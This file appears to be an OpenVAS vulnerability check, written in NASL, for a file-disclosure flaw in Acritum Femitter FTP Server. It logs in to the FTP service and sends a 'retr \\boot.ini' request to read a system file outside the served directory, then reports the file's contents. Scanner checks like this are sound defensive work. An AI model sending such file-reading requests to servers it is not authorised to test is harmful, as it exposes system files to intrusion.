###############################################################################
# OpenVAS Vulnerability Test
# $Id: femitter_ftp_34689.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# Acritum Femitter Server Remote File Disclosure Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################################################################

tag_summary = "Acritum Femitter FTP Server is prone to a remote file-disclosure
   vulnerability because it fails to properly sanitize user-supplied
   input.

   An attacker can exploit this vulnerability to view local files in
   the context of the server process. This may aid in further attacks.

   Acritum Femitter Server 0.96 and 1.03 are affected; other versions
   may be vulnerable as well.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100165");
  script_version("$Revision: 9350 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2009-04-26 20:59:36 +0200 (Sun, 26 Apr 2009)");
  script_bugtraq_id(34689);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Acritum Femitter Server Remote File Disclosure Vulnerability");
  script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("find_service.nasl","secpod_ftp_anonymous.nasl","ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34689");
  exit(0);
}

include("ftp_func.inc");

ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

if(get_kb_item('ftp/'+ftpPort+'/broken'))exit(0);

if(!get_port_state(ftpPort)){
  exit(0);
}

soc1 = open_sock_tcp(ftpPort);
if(!soc1){
  exit(0);
}

domain = get_kb_item("Settings/third_party_domain");
if(isnull(domain)) {
 domain = this_host_name();;
}

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

if(!user)user = "anonymous";
if(!pass)pass = string("openvas@", domain);;

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);

if(login_details)
{
  ftpPort2 = ftp_get_pasv_port(socket:soc1);
  if(ftpPort2)
  {
    soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
    if(soc2)
    {
      send(socket:soc1, data:'retr \\boot.ini\r\n');
      result = ftp_recv_data(socket:soc2);
      close(soc2);
    }
  }
  
  if(result && egrep(pattern: "\[boot loader\]", string: result)) {
   info = string("Here are the contents of the file 'boot.ini' that\nOpenVAS was able to read from the remote host:\n\n"); 
   info += result;
   info += string("\n");

   security_message(port:ftpPort,data:info);
   ftp_close(socket:soc1);
   close(soc1);
   exit(0);
  }  

ftp_close(socket:soc1);
close(soc1);
exit(0);

}

exit(0);
